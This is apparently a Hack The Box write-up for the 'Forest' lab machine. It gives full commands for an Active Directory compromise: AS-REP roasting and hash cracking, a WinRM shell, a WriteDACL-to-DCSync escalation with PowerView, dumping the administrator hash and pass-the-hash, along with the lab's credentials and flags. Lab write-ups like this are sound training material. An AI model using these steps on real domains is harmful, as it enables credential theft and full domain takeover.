# HTB - Forest

## Machine Info

|Field|Details|
|---|---|
|OS|Windows (Server 2019)|
|Difficulty|Easy|
|IP|10.129.194.133|
|Domain|htb.local|
|User|svc-alfresco|
|User flag|`4f92e7c31be272708b053dd705c33ea9`|
|Root flag|`e3fa3bbcf3d87a50b12360b299baa37b`|

## Tags

#htb #windows #active-directory #asreproasting #dcsync #writedacl #exchange-windows-permissions #account-operators #oscp-like

---

## Attack Path Overview

```
LDAP Anonymous Bind → user enumeration
→ AS-REP Roasting → svc-alfresco hash → crack → s3rvice
→ WinRM (port 5985) → user flag
→ Account Operators group → add self to Exchange Windows Permissions
→ WriteDACL on domain → Add-DomainObjectAcl → DCSync rights
→ impacket-secretsdump → Administrator NTLM hash
→ Pass-the-Hash → evil-winrm → root flag
```

---

## Enumeration

### Nmap

```bash
nmap -p- --min-rate 10000 10.129.194.133
nmap -sV -sC -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 10.129.194.133
```

Key ports:

|Port|Service|
|---|---|
|88|Kerberos|
|389/636|LDAP/LDAPS|
|445|SMB|
|5985|WinRM|

Domain Controller for **htb.local**.

### LDAP Anonymous Bind

LDAP allows anonymous authentication and provides valuable domain information:

```bash
# Enumerate domain users
ldapsearch -x -H ldap://10.129.194.133 -b "DC=htb,DC=local" \
  "(objectClass=user)" sAMAccountName | grep sAMAccountName

# Or use enum4linux
enum4linux -a 10.129.194.133
```

Notable user found: **svc-alfresco** — a service account with Kerberos Pre-Authentication disabled.

---

## Foothold — AS-REP Roasting → svc-alfresco

Since `svc-alfresco` has Kerberos Pre-Authentication disabled, we can request an AS-REP without knowing the password and crack it offline.

```bash
impacket-GetNPUsers htb.local/ -usersfile users.txt \
  -dc-ip 10.129.194.133 -no-pass -format hashcat
```

Or target svc-alfresco directly:

```bash
impacket-GetNPUsers htb.local/svc-alfresco -dc-ip 10.129.194.133 \
  -no-pass -format hashcat
```

Hash received:

```
$krb5asrep$23$svc-alfresco@HTB.LOCAL:...
```

Crack with hashcat:

```bash
hashcat -m 18200 svc-alfresco.hash /usr/share/wordlists/rockyou.txt
```

**Credential:** `svc-alfresco : s3rvice`

---

## User Flag — WinRM

Port 5985 (WinRM) is open and svc-alfresco has remote management access:

```bash
evil-winrm -i 10.129.194.133 -u svc-alfresco -p s3rvice
```

```powershell
type C:\Users\svc-alfresco\Desktop\user.txt
# 4f92e7c31be272708b053dd705c33ea9
```

---

## Privilege Escalation — svc-alfresco → Administrator

### Step 1: BloodHound Enumeration

```bash
bloodhound-python -u svc-alfresco -p s3rvice \
  -d htb.local -ns 10.129.194.133 -c all
```

BloodHound reveals the attack path:

- `svc-alfresco` is a member of **Service Accounts**
- **Service Accounts** is a member of **Account Operators**
- **Account Operators** can add members to **Exchange Windows Permissions**
- **Exchange Windows Permissions** has **WriteDACL** on the domain
- WriteDACL → grant DCSync rights → dump all hashes

### Step 2: Add svc-alfresco to Exchange Windows Permissions

```powershell
net group "Exchange Windows Permissions" svc-alfresco /add /domain

# Verify
net user svc-alfresco
# Global Group memberships: *Exchange Windows Perm *Domain Users *Service Accounts
```

### Step 3: Grant DCSync Rights via WriteDACL

Upload PowerView:

```bash
# On Kali
cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 ~/PowerView.ps1
```

```powershell
# In evil-winrm
upload PowerView.ps1
. .\PowerView.ps1

$pass = convertto-securestring 's3rvice' -asplain -force
$cred = new-object system.management.automation.pscredential('htb\svc-alfresco', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" \
  -PrincipalIdentity svc-alfresco -Rights DCSync
```

> ⚠️ **Note:** Forest has an automated cleanup job that removes added group memberships every few minutes. Run Step 2 and Step 3 quickly back-to-back, then immediately run DCSync.

### Step 4: DCSync — Dump Administrator Hash

```bash
impacket-secretsdump htb.local/svc-alfresco:s3rvice@10.129.194.133 \
  -just-dc-user Administrator
```

Output:

```
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```

### Step 5: Pass-the-Hash

```bash
evil-winrm -i 10.129.194.133 -u Administrator \
  -H 32693b11e6aa90eb43d32c72a07ceea6
```

---

## Root Flag

```powershell
type C:\Users\Administrator\Desktop\root.txt
# e3fa3bbcf3d87a50b12360b299baa37b
```

---

## Key Takeaways

- **AS-REP Roasting** — accounts with Pre-Auth disabled leak crackable hashes without any credentials; always check with `GetNPUsers`
- **Account Operators** is a highly privileged built-in group — members can manage most AD groups including Exchange groups
- **Exchange Windows Permissions + WriteDACL** is a well-known AD privilege escalation path; Exchange installations leave dangerous ACLs on the domain object
- **DCSync** requires `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` rights — WriteDACL lets us grant these to any user
- **Automated cleanup** — Forest resets group memberships periodically; always chain the attack steps without delay

## Attack Chain Summary

|Step|Technique|Tool|
|---|---|---|
|Enumeration|LDAP anonymous bind|ldapsearch / enum4linux|
|Foothold|AS-REP Roasting|impacket-GetNPUsers + hashcat|
|Shell|WinRM|evil-winrm|
|Lateral|Account Operators → Exchange Windows Permissions|net group|
|PrivEsc|WriteDACL → DCSync rights|PowerView Add-DomainObjectAcl|
|Root|DCSync + Pass-the-Hash|impacket-secretsdump + evil-winrm|

## Credentials

|User|Password / Hash|Source|
|---|---|---|
|svc-alfresco|s3rvice|AS-REP Roast + hashcat|
|Administrator|32693b11e6aa90eb43d32c72a07ceea6 (NTLM)|DCSync|